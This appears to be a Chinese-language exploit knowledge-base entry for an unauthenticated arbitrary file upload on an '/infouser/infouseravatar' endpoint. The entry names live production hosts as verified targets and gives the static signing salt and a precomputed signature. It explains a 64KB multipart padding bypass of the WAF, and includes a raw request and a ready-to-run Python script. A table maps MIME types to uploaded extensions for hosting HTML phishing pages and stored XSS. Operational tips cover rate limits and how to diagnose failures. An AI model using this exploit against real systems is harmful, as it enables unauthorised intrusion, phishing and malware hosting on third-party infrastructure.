# /infouser/infouseravatar 未授权任意文件上传（客户端静态盐 md5(userid+salt) 自签 + ≥64KB 前置填充绕过 WAF，扩展名由 data-URI MIME 决定）

- **code**: infouser-avatar-unauth-arbitrary-file-upload-data-uri-mime-e
- **kind**: exp
- **category**: file-upload
- **component**: Spring Boot / Tomcat 上传网关（/infouser/infouseravatar）+ nginx 前置内容规则 + 独立静态 nginx 文件域
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: task#614，2026-11-05，Windows 本机 python requests(trust_env=False) 直连两台 57632 网关（sjan.o0hyfmi.club 与 ga7o.h86l3w.com），UA=Chrome/130，间隔 2–3s。① 基线：无填充时 data:image/jpg;base64, 载荷被前置规则拦（403/56B TEST-ERROR，与 kb 条目 waf-body-scan-depth-prefix-padding-bypass-upload 同型）。② 首个 multipart 字段加 x=A×65536 后，两台均 200/123B {"code":1,"message":"success","data":"https://&lt;storage-domain&gt;:52315/group1/M00/00/93/&lt;id&gt;.jpg"}，userid=1 与 userid=643700 均成功、无 token/无用户存在性校验。③ GET 返回 URL → 200/631B、Content-Type: image/jpeg、头 FF D8 FF E0 JFIF，字节与上传 JPEG 一致，确认文件真实落盘且公网匿名可读。④ 扩展名矩阵实测：image/png→.png(200 image/png)、text/html→.html(200 Content-Type: text/html; charset=utf-8，&lt;script&gt;alert(document.domain)&lt;/script&gt; 原样回显)、image/shtml→.shtml(200 text/html)、image/jspx→.jspx(200 静态源码)、image/war→.war(200 application/java-archive)、image/jsp→.jsp(上传成功，但 GET 403；加 ?x=.jpg 仅取回 JSP 源码不执行)、image/aspx→.aspx(403)、image/php→.php(448/0B)。⑤ 签名可离线复算：md5("1smzyavatar") = e55db37c3af396e55445464be51405f8，与实测通过的 securitystring 完全一致，证明无服务端密钥。判定成立理由：未认证 → 200 success → 返回公网 URL → 匿名回读字节一致，四段闭环；且扩展名随 content 可控，故非"仅绕过 WAF"（对比 /infouser/tablevideo 恒回 47B 失败、无 URL）。RCE 未成立：存储侧为纯静态 nginx，.jsp 默认 403、query 绕过只拿到源码，无 Servlet 执行面。
- **path**: pocs/infouser-avatar-unauth-arbitrary-file-upload-data-uri-mime-e/infouser_avatar_unauth_upload.py
- **tags**: file-upload,unauthorized,data-uri,mime-extension-control,waf-bypass,body-scan-depth,prefix-padding,static-salt-signature,storage-xss,spring-boot,tomcat,nginx
- **created_at**: 2026-11-04T18:59:24.165Z
- **engine**: https://sjan.o0hyfmi.club:57632 / https://ga7o.h86l3w.com:57632

## 描述

生产头像上传接口 POST /infouser/infouseravatar：未认证即可上传，防篡改参数是纯客户端静态盐 md5(userid+"smzyavatar")，可离线自算；请求体首个 multipart 字段放 ≥64KB 无害填充即可让 WAF 的内容规则扫不到后面的 data-URI 载荷。文件内容与扩展名完全可控（扩展名取自 data-URI 的 MIME 子类型），落到独立静态文件域后匿名公网可读，可用于任意内容托管 / 同源或跨域存储型 XSS / 钓鱼页投放。存储侧是静态 nginx，上传 .jsp 只得到源码不执行，故不构成 RCE。

## 用法

```
1) 只改 BASE/UID，跑脚本：`BASE=https://<HOST>:<PORT> UID=1 python infouser_avatar_unauth_upload.py`；无需 Cookie/Token/账号。
2) 判成功：HTTP 200 且正文 `{"code":1,"message":"success","data":"https://<storage>/group1/..."}`，随后对 data 里 URL 做一次匿名 GET —— 必须 200 且字节与上传内容一致，否则只算"请求被接受"不算落盘。
3) 要什么后缀就换 data-URI 的 MIME 子类型：text/html→.html（直接当网页打开）、image/png→.png、image/svg→.svg、image/jsp→.jsp、image/war→.war、image/shtml→.shtml。文件内容为 base64 原文，任意字节。
4) 扩展名侧注意：`.jsp/.jspx/.war` 能写进去但存储节点是静态 nginx，GET 默认 403、加 query 只回源码 → 别在上面押 RCE。
5) 关键坑：填充字段必须放在 `file` 之前且是普通字段（不要给 filename，给了就变成真文件上传，该端点只认字符串字段，会 500 Tomcat 页）；填充量 8KB 往往不够，1MB 会被 nginx 413，64KB 是实测可用值；requests 必须 trust_env=False，否则本地代理改变出口让结论失真。单目标控制在 10 发内、间隔 2–7s。
6) 若返回 `{"code":0,...上传失败}` 的 47B 短 JSON：说明已过 WAF 但端点不是写点（例如同网关的 /infouser/tablevideo），换接口再试，不要继续加填充。
```

## 正文

```
# /infouser/infouseravatar 未授权任意文件上传

## 0. 指纹与适用面

- 路径：`POST /infouser/infouseravatar`（头像上传），同一套网关常在多个域名/端口（本例 `:57632`）部署。
- 响应：成功 `{"code":1,"message":"success","data":"https://<storage-host>:<port>/group1/M00/00/XX/<fileid>.<ext>"}`；失败 `{"code":0,"message":"<某文件上传失败>"}`（短 JSON，无 URL）。
- 前端痕迹：安卓/IL2CPP 客户端用 `WWWForm.AddField` 传字符串，因此 `file` 字段是 **data-URI 字符串**而不是真文件 part。
- 同类但**不是写点**的接口：`/infouser/tablevideo` —— 同样能过 WAF，但恒回 47B 失败、不返回 URL。

## 1. 前置条件

1. 无账号、无 Cookie、无 token（实测 userid 任意，含 1）。
2. `securitystring` 无需服务端密钥：**`securitystring = md5(userid + "smzyavatar")`**（客户端硬编码盐，可离线算）。
   例：`md5("1smzyavatar") = e55db37c3af396e55445464be51405f8`。
3. WAF 内容规则只扫正文前若干 KB（拦截页固定 `403 / 56B / <title>TEST-ERROR</title>`）。
   绕过手法：**首个 multipart 字段放 ≥64KB 无害填充**（`x=A×65536`），危险载荷落进扫描窗口之外。
   该通用手法详见 kb 条目 `waf-body-scan-depth-prefix-padding-bypass-upload`。
4. 存储节点与业务节点不同域：通常是一台独立静态 nginx/对象文件域，匿名可读。

## 2. 原始请求（最小可复现）

```
POST /infouser/infouseravatar HTTP/1.1
Host: <HOST>:<PORT>
Content-Type: multipart/form-data; boundary=BOUND
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36

--BOUND
Content-Disposition: form-data; name="x"

AAAA...(65536 个 A，必须是第一个字段)
--BOUND
Content-Disposition: form-data; name="file"

data:image/jpg;base64,<任意内容的 base64>
--BOUND
Content-Disposition: form-data; name="securitystring"

e55db37c3af396e55445464be51405f8
--BOUND
Content-Disposition: form-data; name="userid"

1
--BOUND--
```

期望响应：

```
HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8

{"code":1,"message":"success","data":"https://<storage-host>:52315/group1/M00/00/93/<fileid>.jpg"}
```

## 3. Python 脚本（改 BASE 即用）

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
/infouser/infouseravatar 未授权任意文件上传
- securitystring = md5(userid + "smzyavatar")  客户端静态盐，可离线算
- 首个 multipart 字段放 65536 个 A，越过 WAF 正文扫描深度
- 扩展名 = data-URI 的 MIME 子类型（text/html -> .html, image/jsp -> .jsp ...）
"""
import base64, hashlib, json, os, sys, time
import requests, urllib3
urllib3.disable_warnings()

BASE = os.environ.get("BASE", "https://<HOST>:<PORT>").rstrip("/")
UID  = os.environ.get("UID", "1")
SALT = os.environ.get("SALT", "smzyavatar")
PAD  = int(os.environ.get("PAD", "65536"))
UA   = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36")

def sign(uid):
    return hashlib.md5((str(uid) + SALT).encode()).hexdigest()

def upload(content: bytes, mime: str = "image/jpg", pad: int = PAD, timeout: int = 60):
    body = "data:%s;base64,%s" % (mime, base64.b64encode(content).decode())
    # 顺序敏感：x 必须在 file 之前；不给 filename —— 该端点只认字符串字段
    parts = [
        ("x",              (None, "A" * pad)),
        ("file",           (None, body)),
        ("securitystring", (None, sign(UID))),
        ("userid",         (None, str(UID))),
    ]
    s = requests.Session()
    s.trust_env = False          # 关键：本地代理会污染直连结论
    return s.post(BASE + "/infouser/infouseravatar", files=parts,
                  headers={"User-Agent": UA, "Accept": "*/*"},
                  verify=False, timeout=timeout, allow_redirects=False)

def main():
    samples = [
        # (说明, 内容, MIME子类型 -> 决定落地扩展名)
        ("jpeg",  bytes.fromhex("FFD8FFE000104A46494600010100000100010000FFD9"), "image/jpg"),
        ("html",  b"<html><body><script>alert(document.domain)</script>ARTEX</body></html>", "text/html"),
        ("jsp",   b'<% out.println("ARTEX"); %>', "image/jsp"),
    ]
    for name, data, mime in samples:
        r = upload(data, mime)
        print(name, r.status_code, len(r.content), r.text[:300])
        try:
            url = json.loads(r.text).get("data")
        except Exception:
            url = None
        if url:
            g = requests.get(url, headers={"User-Agent": UA}, verify=False,
                             timeout=30, proxies={"http": None, "https": None})
            print("  readback", g.status_code, g.headers.get("Content-Type"),
                  len(g.content), g.content[:80])
        time.sleep(3)

if __name__ == "__main__":
    main()
```

## 4. 扩展名矩阵（实测结果，直接照抄结论）

| data-URI MIME | 落地后缀 | 匿名 GET 结果 | 说明 |
|---|---|---|---|
| `image/jpg` | `.jpg` | 200 `image/jpeg`，字节一致 | 正常回显 |
| `image/png` | `.png` | 200 `image/png` | 正常 |
| `text/html` | `.html` | 200 `text/html; charset=utf-8`，脚本文本原样 | 可直接托管网页 → 存储型 XSS / 钓鱼 |
| `image/shtml` | `.shtml` | 200 `text/html` | 同上 |
| `image/jsp` | `.jsp` | 上传成功；GET 403；`?x=.jpg` → 200 `application/octet-stream` 返回 JSP 源码 | **不执行** |
| `image/jspx` | `.jspx` | 200 静态源码 | 不执行 |
| `image/war` | `.war` | 200 `application/java-archive` | 仅静态下载 |
| `image/aspx` | `.aspx` | 403 | 存储层 deny |
| `image/php` | `.php` | 448 / 0B | 存储层拒绝 |

> 扩展名**只由 MIME 子类型决定**，与 filename 无关；写 `filename=xxx.jsp` 的真文件 part 会 500（Tomcat 错误页）。

## 5. 判据（四段闭环，缺一不算）

1. 无任何凭据 → 200；
2. 正文 `code=1` 且 `data` 是 http(s) URL；
3. 对该 URL 匿名 GET → 200；
4. GET 回来的字节与上传内容**完全一致**（比对长度 + 头部 magic）。

只做到 1+2 的（返回 47B `{"code":0,...}`、无 URL）说明过了 WAF 但该接口不是写点。

## 6. 影响定级与 RCE 侧否定结论（别再花时间）

- 成立的是：**未认证任意内容 + 任意扩展名写入第三方公网文件域**。
  落点在独立域名上，可用于任意 HTML/JS 托管（钓鱼页）、存储型 XSS（若该域被业务站引用/同源）、
  恶意文件分发（伪装 .jpg 实为任意二进制）。按任意文件上传定 **high**。
- **RCE 不成立（已证否）**：`<storage-host>:52315` 是纯静态 nginx，无 Servlet/JSP 容器。
  `.jsp` 默认 403；`?x=.jpg` 之类 query 绕过只让 nginx 当静态文件返回源码，不交给解析器；
  `.jspx` / `.war` / `.shtml` 同样是静态回显。故"上传 .jsp → 命令执行"这条路在本架构上走不通。
  若换到**同域或业务 Tomcat 的可执行目录**作为存储根时，才需要重新评估。

## 7. 失败时的常见原因

1. **填充位置错误**：`x` 必须在 `file` 之前；放在后面等于没绕。
2. **包成真文件**：给 `file` 加了 filename 或 Content-Type，端点解析失败 → 500 Tomcat 页。必须是普通字符串字段。
3. **填充量不够 / 过大**：8KB 常仍被 403；1MB 会被 nginx 413。先用 65536，再在 9177–66521 之间二分。
4. **签名算错**：`md5(userid + salt)`，注意 userid 用**字符串**拼接、salt 为 `smzyavatar`，不要加分隔符、不要大写。
   `md5("1smzyavatar")` 应等于 `e55db37c3af396e55445464be51405f8`，可先离线自校验。
5. **走了环境代理**：`requests.trust_env=False` 或 curl `--noproxy '*'`，否则出口/TLS 被改写，403 与 200 的判读全部失真。
6. **rate limit**：间隔 2–7s，单目标 ≤10 发；连续快打会触发 nginx limit_req，出现 503/超时被误判为"封了"。

## 8. 证伪条件

- 加了 64KB 填充仍回 403/56B 固定拦截页 → WAF 不是深度限制（或规则已改）。
- 返回 200 但正文无 `data` URL / 回读 404 / 字节不一致 → 上传未真实落盘，本条不成立。
- 若接口开始要求 token 或有效会话（`securitystring` 改用服务端密钥）→ 未授权前提消失。

```
